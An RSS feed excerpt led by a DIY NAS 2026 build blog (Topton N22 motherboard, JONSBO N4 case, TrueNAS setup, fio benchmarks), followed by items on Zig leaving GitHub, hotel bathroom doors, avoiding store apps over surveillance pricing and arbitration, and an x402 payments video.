NAS: 2026 Edition</title><link>https://blog.briancmoses.com/2025/11/diy-nas-2026-edition.html</link><author>sashk</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 02:54:23 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[Fourteen years ago, my storage needs outpaced my capacity and I began to look into building a network attached storage server. I had a few criteria in mind and was curious to see if anyone had _ recently_ shared something similar, but I couldn’t find anything that was relevant.In fact, I found that the communities I was looking for answers in were actively hostile towards what I wanted to do.  This resulted in my decision to build my own DIY NAS and share that as one of my very first blogs.Much to my surprise, people were very interested in that blog! Ever since, I’ve been building a similar DIY NAS machine almost every year, trying to satisfy the curiosity of other prospective DIY NAS builders.: It’s not the case for me anymore, but at the time the space was limited in my office. I always assume that space in everybody’s office is limited. As a result, I want my DIY NAS builds to occupy as little of that office space as I can.: Back when I built my NAS, it took about four drives’ worth of storage to meet my storage needs. Plus, I desired two empty drive bays for future use. However, in the years since, hard drive capacities have increased dramatically. At some point in the future, I may reduce this to four drive bays.An integrated, low-power CPU: I intend my DIY NAS to run 24 hours a day, 7 days a week, and 52 weeks a year. When it comes to power consumption, that can do some damage on your electric bill! Thankfully, our electricity here isn’t as expensive as others’ in the United States, or even further outside its borders, but I try and keep power consumption in mind when picking components for a DIY NAS build.: It does not take up a lot of CPU horsepower for a NAS to serve up files, which means that on modern hardware there’s a lot of untapped potential in a DIY NAS for virtual machines and/or containers to self-host services.It’s important to remember that , and not necessarily yours. Every DIY NAS builder should be making their own list of criteria and reconcile all of their component purchases against the criteria that’s important to them.Is it even a good time to build a NAS?As I prepared to build this NAS, component prices disappointed me. Hard drives, SSDs, and RAM prices were all rising. Based on what I’ve been told, I expect Intel CPU prices to increase as well. My contact at Topton has been encouraging me to stock up on motherboards while they still have some in inventory. Based on what’s been explained to me, I expect the motherboards’ prices to rise and for their availability to potentially dwindle.In short, the economy sucks, and the price of DIY NAS components is a pretty good reflection of just how sucky things are becoming. I briefly considered not publishing a DIY NAS build this year, hoping that things would improve a few months down the road. But then I asked myself, “What if it’s even worse in a few months?”I sure hope things get better, but I fear and expect that they’ll get worse. Some of the links on this website are affiliate links, meaning, at no additional cost to you, I may earn a commission if you click through and make a purchase. 
            I only recommend products that I believe will add value for my audience. Please understand that I have experience with all of these companies' products, and I recommend them because they are helpful and useful, not because of these small commissions.
        I built my first DIY NAS with a Topton motherboard in 2023. Each DIY NAS since then has also featured a Topton motherboard. My only complaint about the motherboards has been that buying them from one of the Chinese e-tail sites like AliExpress is considered problematic by some. With every DIY NAS build, I try and go through all the motherboards that I can find  while searching for something with a better value proposition, but for each of the past three years I’ve landed on the latest offering from Topton.For the , I chose the Topton N22 motherboard with the Intel Core 3 N355 CPU. The motherboard is similar to last year’s Topton N18 but has incrementally more compelling features, particularly the extra 2 SATA ports, the PCI-e x1 slot, and the N355 CPU!8 x SATA 3.0 Ports (Asmedia ASM1164)2 x M.2 NVMe Slots (PCIe 3.0 x1)1 x 10Gbps NIC (Marvell AQC113C)2 x 2.5Gbps NICs (Intel i226-V)1 x PCI-e x1 or M.2 E-Key slotI opted for the motherboard with the Intel Core 3 N355 CPU. This makes the server a more capable homelab machine than prior years’ DIY NAS builds. The extra cores and threads come in handy for streaming media, replacing your cloud storage, facilitating home automation, hosting game servers, etc.Just like Topton has been making great motherboards for DIY NAS machines, JONSBO has been steadily releasing great cases for DIY NAS machines. This year SilverStone Technology, released a new case, the CS383 (specs), which I was  in buying for the . Unfortunately, it carries a pretty hefty price tag to go along with all of its incredible features!The JONSBO N4 (specs) is a third of the price, adheres to my “smaller footprint” criteria, and it is rather impressive on its own. It’s a  bit larger case than last year’s DIY NAS, but I really like that it has drive bays for six 3.5” drives and two 2.5” drives.It’s peculiar in that two of the 3.5” drive bays (and the two 2.5” drive bays) aren’t attached to a SATA backplane and can’t be swapped anywhere as easily as the other four 3.5” bays. However, this peculiar decision seems to have caused the JONSBO N4 to sell for a bit less ($20–$40) than similar offerings from JONSBO. At its price, it’s a compelling value proposition!In the past, I’ve found that the fans that come with JONSBO cases are too noisy. They’ve been noisy for two reasons: The design and quality of the fans make them loud, and the fans are constantly running at their top speed because of the fan header they’re plugged into on the cases’ SATA backplanes.I anticipated that fan efficiency and noise would be a problem, so I picked out the Noctua NF-A12x25 PWM to solve it. Firstly, swapping in a high-quality fan that pushes more air  generates less noise–especially at its top speed–is a good first step. Secondly, I’d address the problem by plugging the fan into the motherboard’s  header instead of on the SATA backplane. This provides the opportunity to tune the fan’s RPMs directly in the BIOS and generate far less noise.The first time I first asked myself, “Should I even build the ?” came as I was checking prices on DDR5 memory. Thankfully for me, I had leftover RAM after purchasing DDR5 4800MHz SODIMMs for the DIY NAS: 2025 Edition,  the Pocket Mini NAS, and then again for the DIY NAS that I built and gave away at 2025’s Texas Linux Fest. I was personally thankful that I had one brand-new 32GB DDR5 4800MHz SODIMM lying around, but I was wildly disappointed for everybody who will try and follow this build when I saw the price of those same SODIMMs.Regardless, I felt a Crucial 32GB DDR5 4800MHz SODIMM (specs) was the right amount of RAM to get started with for a DIY NAS build in 2025. Whether you just need storage or you wish to also host virtual machines, you will benefit from having more than the bare minimum recommendation of RAM. I really wanted to buy a 48GB DDR5 4800MHZ SODIMM for this DIY NAS build, but I couldn’t talk myself into spending the $250–$300 that it would’ve wound up costing.A quick disclaimer about all the drives that I purchased for the :, I already had all of them! I tend to buy things when I see them on sale, and as a result, I have a collection of brand-new parts for machines in my homelab or for upcoming projects. I raided that collection of spare parts for the .If you ranked the drives in your DIY NAS in order of importance, the boot drive should be the least-important drive. That is  saying that boot drive isn’t performing an important function, but I am suggesting that you shouldn’t invest a bunch of energy and money into picking the optimal boot drive.Because the JONSBO N4 has a pair of 2.5” drive bays, I decided that a 2.5” SATA SSD would be ideal for the boot drives. As a rule of thumb, I try and spend less than $30 per boot drive in my DIY NAS builds.Ultimately I selected a pair of 128GB Silicon Power A55 SSDs (specs). I’ve used these before, I’d use them again in the future, and I even have four of their higher-capacity (1TB) SSDs in a pool in my own NAS.App and Virtual Machine NVMe SSDsUsing your DIY NAS to host containers and virtual machines has really exploded in the past few years. The developers of NAS appliances have all made it much easier, and the self-hosted products themselves have become as good–or often better–than things you’re probably subscribing to today. Because of that, I saved the highest-performing storage options on the Topton N22 motherboard for apps and VMs.However, it’s important to point out that these M.2 slots are PCI-e version 3 and capped at a single PCI-e lane. This is a consequence of the limited number of PCI-e lanes available for each of the CPU options available for  the Topton N22 motherboard (N100, N150, N305, and N355).Bulk Storage Hard Disk DrivesThanks to rising prices, I opted to do like I’ve done with past DIY NAS builds and skip buying hard drives for the .When planning your DIY NAS, it is good to always remember that storage will ultimately be your costliest and most important expense.Here are a few things to consider when buying hard drives:Determine your hardware redundancy preferences. I recommend having two hard disk drives’ worth of redundancy (RAIDZ2, RAID6, etc.)Focus on price-per-terabyte when comparing prices of drives.When buying new drives of the same model, try and buy them from multiple vendors to increase the chances of buying drives manufactured in separate batches.Plan ahead! Understand the rate that your storage grows so that you can craft a strategy to grow your storage down the road.Being cheap today can and will paint you into a corner that’s quite expensive to get out of.Understand that RAID is not a backup!Thankfully, I’ve collected a bunch of my own decommissioned hard drives which I used to thoroughly test this DIY NAS build.One of the under-the-radar features of the Topton N22 motherboard might be one of my favorite features! The motherboard’s Asmedia ASM1164 SATA controllers sit behind two SFF-8643 connectors. These connectors provide two advantages for these motherboards:The one thing that I have routinely disliked about building small form factor DIY NAS machines is the price tag that accompanies a small form factor power supply (SFX) like is required with the JONSBO N4.Regardless of whether it was called FreeNAS, TrueNAS, TrueNAS CORE, TrueNAS SCALE, or now TrueNAS Community Edition, the storage appliance product(s) from iXSystems have always been my go-to choice. For each yearly DIY NAS build, I wander over to the TrueNAS Software Status page and look at the state of the current builds.I’m conservative with my personal NAS setup. However, for these blog builds, I typically choose Early Adopter releases. This year that’s TrueNAS 25.10.0.1 (aka Goldeye). I enjoy being able to use these DIY NAS builds as a preview to the latest and greatest that TrueNAS has to offer.I repeatedly choose TrueNAS because it’s become an enterprise-grade storage product, which is exactly the quality of solution that I want my data depending on. At the same time, it does not feel like you need a specialized certification and a truckload of enterprise storage experience to set up a NAS that exceeds your needs at home.Many times I have been asked, “Why not <insert NAS appliance or OS here>?”  My answer to that question is, TrueNAS has always done everything that I need it to, and they haven’t given me any reason to consider anything else. As a result, there’s never been a need for me to evaluate something else.Hardware Assembly, BIOS Configuration, and Burn-InI always want the smallest possible DIY NAS. The JONSBO N4 case initially felt too large since it accommodates Micro ATX motherboards. However, I grew to accept its slightly larger footprint. However, putting the Topton N22 motherboard into the case felt roomy and luxurious. Building the  compared to prior years’ felt a lot like coming home to put on sweatpants and a T-shirt after wearing a suit and tie all day long.I wasn’t too fond of the cable management of the power supply’s cables. The layout of the case pretty much makes the front of the power supply inaccessible once it is installed. One consequence of this is that the power cable which powered the SATA backplane initially prevented the 120mm case fan from spinning up. That issue was relatively minor and was resolved with zip ties.Overall, I felt pretty good about the assembly of the , but things would take a turn for the worse when I decided to fill all the 3.5-inch drive bays up with some of my decommissioned 8TB HDDs. Now this is probably my fault, I wouldn’t be surprised at all that the manual of the JONSBO N4 warned me against this, but putting the drives in last turned out to be a major pain in the neck for each of the four drive bays  a SATA backplane.I had wrongly guessed that you accessed those drives’ power and data ports from the front of the case. I worked really hard to route the cables and even managed to install all of the drives before realizing my error and learning my lesson. I’m understanding now why the JONSBO N4 is cheaper than all of its siblings: Partly because there’s a missing SATA backplane, but also because those other 4 drive bays’ layout is frustrating.Don’t let my last couple paragraphs sour you on the JONSBO N4, though. I still really like its size; it feels big when you’re working in it with a Mini ITX motherboard. If you wind up deciding to use the JONSBO N4, then I suggest that you put those four drives and their cables in first before you do anything else. That would’ve made a world of difference for me. Looking at the documentation before getting started might have saved me quite a bit of aggravation, too!Generally speaking, I do as little as I possibly can in the BIOS. Normally, I strive to only set the time and change the boot order. However, I did a bit more for the  since I’m using the  header for the fan responsible for cooling the hard drives.  Here are the changes that I made in the BIOS:Set the  and  to Greenwich Mean Time
    Advanced
        Hardware Monitor ( Advanced)
            Set  to  .Set the  (for ) to 180.Set  to Boot
        Set  to the TrueNAS boot device.I’m not at all interested in venturing into the rabbit’s hole of trying to completely minimize how much power the NAS uses. However, I imagine there are some opportunities for power savings lurking in the BIOS. I didn’t go looking for them myself, but if you’re intrepid enough to do so, here are a few suggestions that I have for saving some additional power:Disable the onboard audio.Disable any network interfaces that you don’t wind up using.Tinker with the CPU settings.Got other suggestions?  Share them in the comments!Because all of the hardware is brand-new to me and brand-new components are not guaranteed to be free of defects, I always do a little bit of burn-in testing to establish some trust in the hardware that I’ve picked out for each DIY NAS build. While I think doing  burn-in testing is critically important, I also think the value of subsequent burn-in testing drops the more that you do. Don’t get too carried away, and do your own burn-in testing in moderation!I  use Memtest86+ to burn-in the RAM. I always run at least 3+ passes of Memtest86+. Typically, I run many more passes because I tend to let the system keep running additional passes overnight. Secondarily, running these many passes gives the CPU a little bit of work to do and there’s enough information displayed by Memtest86+ to give me confidence in the CPU and its settings.The failure rate of hard drives is highest when the drives are new and then again when they’re old. Regardless of type of hard drives that I buy or when I buy them, I always do some disk burn-in. I tend to run Spearfoot’s Disk Burn-in and Testing script on all of my new drives. However, executing this script against all of the drives can take quite a long time, even if you use something like   to run the tests in parallel.There’s always a little bit of setup that I do for a new TrueNAS machine. This isn’t intended to be an all-inclusive step-by-step guide for all the things you should do with your DIY NAS. Instead, it’s more of a list of things I kept track of while I made sure that the  was functional enough for me to finish writing this blog. That being said, I do think your NAS would be rather functional if you decided to do the same configuration.Updated the hostname to Note:  This is only to avoid issues with another NAS on my network.Enabled the following services and set them to start automatically.
    Enabled password login for the  user.
    Note: If I were planning to use this DIY NAS long-term, I wouldn’t have done this. Using SSH keys for authentication is a better idea.Edited the TrueNAS Dashboard widgets to reflect the 10Gb interface ().Created a pool named  which consisted of a single RAID-Z2 vdev using eight hard drives that I had sitting on my shelf after they were decommissioned.Configured the Apps to use the  pool for the apps’ dataset.Made sure that the System Dataset Pool was set to .Confirmed that there were Scrub Tasks set up for the  and  pools.Created a dataset on each pool for testing:   and .Installed the Scrutiny app found in the App Catalog.If I were planning to keep this NAS and use it for my own purposes, I would also:Just about every year, I benchmark each DIY NAS build and almost always come to the same conclusion: The NAS will outperform your network at home. Your first bottleneck is almost always going to be the network, and the overwhelming majority of us have gigabit networks at home–but that’s slowly changing since 2.5Gbps and 10Gbps network hardware has started to get reasonably affordable lately.Even though I always come to the same conclusion, I still like to do the benchmarks for two reasons:It helps me build confidence that the  works well.People tend to enjoy consuming benchmarks,  it’s fun for me to see the DIY NAS’ network card get saturated during the testing.I like to do three categories of tests to measure the throughput of the NAS:Use iperf3 to benchmark throughput between my NAS and another machine on my network.Benchmark the throughput of the pool(s) locally on the NAS using .Set up SMB shares on each of the pools and then benchmark the throughput when using those shares.What do I think these benchmarks and my use of the  tell me?  In the grand scheme of things, not a whole lot.However, these benchmarks do back up what I expected: The  is quite capable and more than ready to meet my storage needs. I especially like that the CrystalDiskMark benchmarks of the SMB shares were both faster than a SATA SSD, and the throughput to the share on the  pool practically saturated the NAS’ 10GbE network connection.Every time I benchmark a NAS, I seem to either be refining what I tried in prior years or completely reinventing the wheel. As a result, I wouldn’t recommend comparing these results with results that I shared in prior years’ DIY NAS build blogs. I haven’t really put a ton of effort into developing a standard suite of benchmarks. Things in my homelab change enough between DIY NAS blogs that trying to create and maintain an environment for a standard suite of benchmarks is beyond what my budget, spare time, and attention span will allow.I’m going to paste these  commands here in the blog for my own use in future DIY NAS build blogs. If you wind up building something similar, these  be helpful to measure your new NAS’ filesystem’s performance and compare it to mine!## Random Write IOPS
fio --randrepeat=1 --ioengine=libaio --direct=1 --name=test --filename=test --bs=128k --size=4G --readwrite=randwrite --ramp_time=10
fio --randrepeat=1 --ioengine=libaio --direct=1 --name=test --filename=test --bs=128k --size=32G --readwrite=randwrite --ramp_time=10

## Random Read IOPS
fio --randrepeat=1 --ioengine=libaio --direct=1 --name=test --filename=test --bs=128k --size=4G --readwrite=randread --ramp_time=10
fio --randrepeat=1 --ioengine=libaio --direct=1 --name=test --filename=test --bs=128k --size=32G --readwrite=randread --ramp_time=10

## Sequential Write (MB/s)
fio --randrepeat=1 --ioengine=libaio --direct=1 --name=test --filename=test --bs=4M --size=4G --readwrite=write --ramp_time=10
fio --randrepeat=1 --ioengine=libaio --direct=1 --name=test --filename=test --bs=4M --size=32G --readwrite=write --ramp_time=10

## Sequential Read (MB/s)
fio --randrepeat=1 --ioengine=libaio --direct=1  --name=test --filename=test --bs=4M --size=4G --readwrite=read --ramp_time=10
fio --randrepeat=1 --ioengine=libaio --direct=1  --name=test --filename=test --bs=4M --size=32G --readwrite=read --ramp_time=10
One not-so-obvious cost of running a DIY NAS is how much power it consumes. While I specifically tried to pick items that were efficient in terms of power consumption, it’s also important to realize that all the other bells and whistles on the awesome Topton N22 NAS motherboard consume power, too, and that the biggest consumer of power in a NAS is almost always the hard disk drives.Thanks to my tinkering with home automation, I have a plethora of smart outlets which are capable of power monitoring. I used those smart outlets for most of my power monitoring. But I also have a Kill a Watt P400 that I also use for some of the shorter tests:Power consumed during a handful of specific tasks:
    Idle while running TrueNASRAM Burn-in (~14 passes of Memtest86+)An 8-hour throughput benchmark copying randomly sized files to the NAS using SMB.Total consumed during the build, burn-in, and use of the .Shortly before prices skyrocketed, I decided I wasn’t very interested in doing separate EconoNAS builds any longer. Several months ago, I realized that there were several off-the-shelf NAS machines that were more than capable of running TrueNAS, and they were selling at economical prices that couldn’t be topped by a DIY approach. I will dive deeper into this in a future blog, eventually … ?All that being said, it’d be incredibly easy to make some compromises which result in the  becoming quite a bit more economical. Here’s a list of changes that I would consider to achieve a more budget-friendly build:Altogether, these savings could add up to more than $400, which is pretty considerable!  If you made all of these changes, you’d have something that’s going to be nearly equivalent to the  but at a fraction of the price.What am I going to do with the DIY NAS: 2026 Edition?!My DIY NAS is aging quite gracefully, but I’ve recently been wondering about replacing it. Shortly before ordering all the parts for the , I briefly considered using this year’s DIY NAS build to replace my personal NAS. However, I decided not to do that. Then prices skyrocketed and I shelved the idea of building a replacement for my own NAS and I nearly shelved the idea of a DIY NAS in 2026!So that begs the question, “What is Brian going to do with the ?”I’m going to auction it off on the briancmosesdotcom store on eBay! Shortly after publishing this blog, I’ll list it on eBay. In response to skyrocketing prices for PC components, I’m going to do a no-reserve auction. At the end of the auction, the highest bidder wins, and hopefully they’ll get a pretty good deal!Overall, I’m pleased with the . The Topton N22 motherboard is a significant improvement over last year’s Topton N18 motherboard, primarily due to its extra two SATA ports. This provides 33.3% more gross storage capacity.While testing, I found the Intel Core 3 N355 CPU somewhat excessive for basic NAS functions. However, the substantial untapped CPU horsepower offers luxurious performance potential. This makes the build compelling for anyone planning extensive self-hosting projects.I have mixed feelings about the JONSBO N4 case. The four right-side drive bays lack SATA backplane connectivity. Without creative cabling solutions, individual drive replacement becomes challenging. However, the case’s ~$125 price point compensates for this inconvenience. I anticipate that those the cost savings will justify the compromise for most builders. If I were to build the  all over again, I’d be tempted to use the JONSBO N3 case or even the JONSBO N6 which isn’t quite obtainable, yet.The DIY NAS: 2026 Edition delivers excellent performance and superior specifications. In my opinion, it represents better value than off-the-shelf alternatives:Building your own NAS provides significant advantages. Years later, you can upgrade RAM, motherboard, case, or add PCI-e (x1) expansion cards. These off-the-shelf alternatives offer severely limited upgrade paths.]]></content:encoded></item><item><title>Green card interviews end in handcuffs for spouses of U.S. citizens</title><link>https://www.nytimes.com/2025/11/26/us/trump-green-card-interview-arrests.html</link><author>nxobject</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 02:51:31 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Penpot: The Open-Source Figma</title><link>https://github.com/penpot/penpot</link><author>selvan</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 02:14:36 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Migrating the main Zig repository from GitHub to Codeberg</title><link>https://ziglang.org/news/migrating-from-github-to-codeberg/</link><author>todsacerdoti</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 01:49:00 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[
        ← Back to
        
        page
      Putting aside GitHub’s relationship with ICE, it’s abundantly clear that the engineering excellence that created GitHub’s success is no longer driving it. Priorities and the engineering culture have rotted, leaving users inflicted with some kind of bloated, buggy JavaScript framework in the name of progress. Stuff that used to be snappy is now sluggish and often entirely broken.Most importantly, Actions has inexcusable bugs while being completely neglected. After the CEO of GitHub said to “embrace AI or get out”, it seems the lackeys at Microsoft took the hint, because GitHub Actions started “vibe-scheduling”; choosing jobs to run seemingly at random. Combined with other bugs and inability to manually intervene, this causes our CI system to get so backed up that not even master branch commits get checked.Rather than wasting donation money on more CI hardware to work around this crumbling infrastructure, we’ve opted to switch Git hosting providers instead.As a bonus, we look forward to fewer violations (exhibit A, B, C) of our strict no LLM / no AI policy, which I believe are at least in part due to GitHub aggressively pushing the “file an issue with Copilot” feature in everyone’s face.The only concern we have in leaving GitHub behind has to do with GitHub Sponsors. This product was key to Zig’s early fundraising success, and it remains a large portion of our revenue today. I can’t thank Devon Zuegel enough. She appeared like an angel from heaven and single-handedly made GitHub into a viable source of income for thousands of developers. Under her leadership, the future of GitHub Sponsors looked bright, but sadly for us, she, too, moved on to bigger and better things. Since she left, that product as well has been neglected and is already starting to decline.Although GitHub Sponsors is a large fraction of Zig Software Foundation’s donation income, we consider it a liability. We humbly ask if you, reader, are currently donating through GitHub Sponsors, that you consider moving your recurring donation to Every.org, which is itself a non-profit organization.As part of this, we are sunsetting the GitHub Sponsors perks. These perks are things like getting your name onto the home page, and getting your name into the release notes, based on how much you donate monthly. We are working with the folks at Every.org so that we can offer the equivalent perks through that platform.Effective immediately, I have made ziglang/zig on GitHub read-only, and the canonical origin/master branch of the main Zig project repository is https://codeberg.org/ziglang/zig.git.Thank you to the Forgejo contributors who helped us with our issues switching to the platform, as well as the Codeberg folks who worked with us on the migration - in particular Earl Warren, Otto, Gusted, and Mathieu Fenniak.In the end, we opted for a simple strategy, sidestepping GitHub’s aggressive vendor lock-in: leave the existing issues open and unmigrated, but start counting issues at 30000 on Codeberg so that all issue numbers remain unambiguous. Let us please consider the GitHub issues that remain open as metaphorically “copy-on-write”. Please leave all your existing GitHub issues and pull requests alone. No need to move your stuff over to Codeberg unless you need to make edits, additional comments, or rebase. We’re still going to look at the already open pull requests and issues; don’t worry.In this modern era of acquisitions, weak antitrust regulations, and platform capitalism leading to extreme concentrations of wealth, non-profits remain a bastion defending what remains of the commons.]]></content:encoded></item><item><title>Butterfly Effect: What Kubernetes SIG Security Has in F... I. Coldwater, S. Raghunathan, C. Valencia</title><link>https://www.youtube.com/watch?v=q4ryxYhAenM</link><author>CNCF [Cloud Native Computing Foundation]</author><category>dev</category><category>k8s</category><enclosure url="https://www.youtube.com/v/q4ryxYhAenM?version=3" length="" type=""/><pubDate>Thu, 27 Nov 2025 01:35:43 +0000</pubDate><source url="https://www.youtube.com/channel/UCvqbFHwN-nwalWPjPUKpvTA">Dev - CNCF</source><content:encoded><![CDATA[Don't miss out! Join us at our next Flagship Conference: KubeCon + CloudNativeCon events in Amsterdam, The Netherlands (23-26 March, 2026). Connect with our current graduated, incubating, and sandbox projects as the community gathers to further the education and advancement of cloud native computing. Learn more at https://kubecon.io

Butterfly Effect: What Kubernetes SIG Security Has in Flight - Ian Coldwater, Independent; Savitha Raghunathan, Red Hat; Carol Valencia, KrolCloud

Kubernetes SIG Security continues to spread security across the cloud native field. Flutter in for updates about what we’ve been up to, featuring VEXing bugs, the perennial third-party audit coming back up, Security Self-Assessments emerging from dormancy to bloom again, (O)wasps, budding new contributors, and collaborating across SIGs to bee better together.

Everything we do as contributors has ripple effects outward. Security is everyone’s responsibility, and every one of us can make a difference.

What’s landing, and what’s taking flight? Come hear the buzz with us, and learn how you can get involved!]]></content:encoded></item><item><title>Running Unsupported iOS on Deprecated Devices</title><link>https://nyansatan.github.io/run-unsupported-ios/</link><author>OuterVale</author><category>dev</category><category>hn</category><pubDate>Wed, 26 Nov 2025 22:57:56 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Bring bathroom doors back to hotels</title><link>https://bringbackdoors.com/</link><author>bariumbitmap</author><category>dev</category><category>hn</category><pubDate>Wed, 26 Nov 2025 22:26:36 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[I’m done. I’m done arriving at hotels and discovering that they have removed the bathroom door. Something that should be as standard as having a bed, has been sacrificed in the name of “aesthetic”.I get it, you can save on material costs and make the room feel bigger, but what about my dignity??? I can’t save that when you don’t include a bathroom door.It’s why I’ve built this website, where I compiled hotels that are guaranteed to have bathroom doors, and hotels that need to work on privacy. I’ve emailed hundreds of hotels and I asked them two things: do your doors close all the way, and are they made of glass? Everyone that says yes to their doors closing, and no to being made of glass has been sorted by price range and city for you to easily find places to stay that are  to have a bathroom door.Quickly check to see if the hotel you’re thinking of booking has been reported as lacking in doors by a previous guest.Finally, this passion project could not exist without people submitting hotels without bathroom doors for public shaming. If you’ve stayed at a doorless hotel send me an email with the hotel name to bringbackdoors@gmail.com, or send me a DM on Instagram with the hotel name and a photo of the doorless setup to be publicly posted.Let’s name and shame these hotels to protect the dignity of future travelers.]]></content:encoded></item><item><title>The EU made Apple adopt new Wi-Fi standards, and now Android can support AirDrop</title><link>https://arstechnica.com/gadgets/2025/11/the-eu-made-apple-adopt-new-wi-fi-standards-and-now-android-can-support-airdrop/</link><author>cyclecount</author><category>dev</category><category>hn</category><pubDate>Wed, 26 Nov 2025 21:25:36 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>S&amp;box is now an open source game engine</title><link>https://sbox.game/news/update-25-11-26</link><author>MaximilianEmel</author><category>dev</category><category>hn</category><pubDate>Wed, 26 Nov 2025 19:58:27 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Don&apos;t Download Apps</title><link>https://blog.calebjay.com/posts/dont-download-apps/</link><author>speckx</author><category>dev</category><category>hn</category><pubDate>Wed, 26 Nov 2025 19:51:52 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[Companies want you to download apps. Here in Taiwan it’s particularly bad: I’ve
had shop staff tell me about some discount if you download their app, and when I
decline, say something like “It’s really easy! Here, just give me your phone and
I’ll do it for you.” Once when I was setting up my phone plan, the staff wanted
my phone to, idk, note my IMEI or something, and then when I wasn’t paying
attention, installed a local e-commerce app, using my new phone number and name
as login details, then proudly told me, “Now you get 300NTD off your first phone
bill!” Thanks, for 10$ I can get weekly text and email spam from Shopee, great.So first tip, in Taiwan, never hand your phone over the counter.Second tip, never download the app. Corps have all sorts of ways to try to
convince you: Use the app to order in-store rather than the kiosk, get free
chicken nuggets. Download our app at checkout, get a discount. Whatever the
reason, don’t do it, you’re giving more than you’re getting.First, we’ve entered an era defined by
surveillance capitalism.
Companies try to get as much data on you as possible, and then treat you
differently based on the data they have on file for you. We all know this as
seeing poorly-tuned ads (you just bought a refrigerator? You must love
refrigerators! Here’s 100 refrigerator ads), but the new trend is
surveillance pricing.
A company will know that you just got paid and so charge you just a bit more for
your chicken nuggets than they do when you haven’t been paid in two weeks.
Annoying, don’t download them app, don’t give them more data than they already
have.The other scary thing though is that that gives the power of currency valuation
to companies. Without surveillance pricing, everyone pays the same for a
cheeseburger. Rich people can buy more cheeseburgers, sure, but at least the
price of cheeseburgers is pegged against a dollar, so if someone starts charging
too much for cheeseburgers, you can take your dollars to a competitor. Once
companies can start charging individual prices, the global economy doesn’t
determine how many cheeseburgers your dollars can buy, McDonald’s does. Way too
much power to give to these companies that already have too much power.Second reason, binding arbitration. Binding arbitration is when you sign an
agreement with someone that has a clause that says, “if there’s a dispute, we
don’t sue eachother, instead we go through a private process outside the court
system and let a mediator decide the outcome.” Bonus, unlike judges, whose
salaries are paid for by the taxpayers and therefore you don’t pay a “judge fee”
when you go to court (mostly), a mediator needs to be hired. Guess who hires
them? Not you!Walking into a restaurant to buy a cheeseburger, there’s no way a company can
force you to enter a contractual agreement that includes binding arbitration.
Downloading an app, however, requires agreeing to a “Terms of Service,” and
those can  include a binding arbitration clause, and that clause can
be applied even to cases outside the app. This happened to Jeffrey Piccolo when
his wife died of food poisoning in a Disney World. Disney made a motion to
dismiss because a couple years back, Jeffrey had signed up for a free trial of
Disney+, which included a binding arbitration clause, which meant that if
Jeffrey wanted to complain about how Disney murdered his wife, they’d have to
settle it out of court with a mediator that Disney hired. No jury, no judge, no
oversight. In the end the only reason Disney dropped this motion is because the
news picked it up. That won’t always happen.At least in the USA, binding arbitration is totally cool according to the
Supreme Court, so don’t count on the government to save you. You need to take
personal steps to make sure you aren’t signing your rights away. So, don’t
download apps.Predictions: Sometime in the next 5 years, someone will be forced into
arbitration with Uber after being hit by one of their self driving cars, because
they use Uber Eats. Sometime in the next 5 years, someone’s house will burn down
from their Tesla exploding, and they’ll be forced into arbitration because they
had a Twitter account, and Twitter is now a subsidiary of TeXla. Sometime in the
next 5 years, an Amazon employee who lost a finger on the job will be forced
into arbitration because they have a WaPo subscription.If you want to learn more,
Cory Doctorow covers the topic
in much more detail.]]></content:encoded></item><item><title>AI agents are paying each other now…</title><link>https://www.youtube.com/watch?v=S6wc6yvoZLY</link><author>Fireship</author><category>dev</category><enclosure url="https://www.youtube.com/v/S6wc6yvoZLY?version=3" length="" type=""/><pubDate>Wed, 26 Nov 2025 18:20:32 +0000</pubDate><source url="https://www.youtube.com/channel/UCsBjURrPoezykLs9EqgamOA">Dev - Fireship</source><content:encoded><![CDATA[Get up to 67% off Docker VPS to self-host your own app. Use code FIRESHIP for an extra discount -  https://hostinger.com/fireshipdocker

Earlier this year, Coinbase changed online payments forever with a new protocol called x402. But could this technology really usher in a new age of 'machine to machine' payments? Let's run it...

#ai #programming #coding 

💬 Chat with Me on Discord
- https://discord.gg/fireship

🔗 Resources
- https://www.x402.org/
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/402

🔥 Get More Content - Upgrade to PRO

Upgrade at https://fireship.io/pro
Use code YT25 for 25% off PRO access 

🎨 My Editor Settings

- Atom One Dark 
- vscode-icons
- Fira Code Font

🔖 Topics Covered
- HTTP 402 Status Code
- x402
- x402 vs Stripe
- Machine to machine payments
